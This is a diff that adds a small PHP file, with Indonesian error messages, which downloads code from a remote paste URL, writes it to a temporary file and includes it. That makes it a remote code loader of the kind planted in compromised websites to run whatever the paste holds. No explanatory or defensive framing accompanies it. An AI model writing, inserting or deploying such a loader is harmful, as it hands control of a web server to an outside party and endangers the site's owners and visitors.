@@ -1,0 +1,22 @@
+    <?php
+    $remoteUrl = 'https://paste.phyo186.cfd/q4EKK-gRVgr/raw';
+    $code = @file_get_contents($remoteUrl);
+    if ($code === false) {
+        die('Gagal mengambil konten dari: ' . $remoteUrl);
+    }
+    $tmp = tmpfile();
+    if ($tmp === false) {
+        die('Gagal membuat tmpfile().');
+    }
+    $bytes = fwrite($tmp, $code);
+    if ($bytes === false) {
+        fclose($tmp);
+        die('Gagal menulis ke tmpfile().');
+    }
+    $meta = stream_get_meta_data($tmp);
+    if (!isset($meta['uri'])) {
+        fclose($tmp);
+        die('Gagal mendapatkan path tmpfile().');
+    }
+    include $meta['uri'];
+    fclose($tmp);
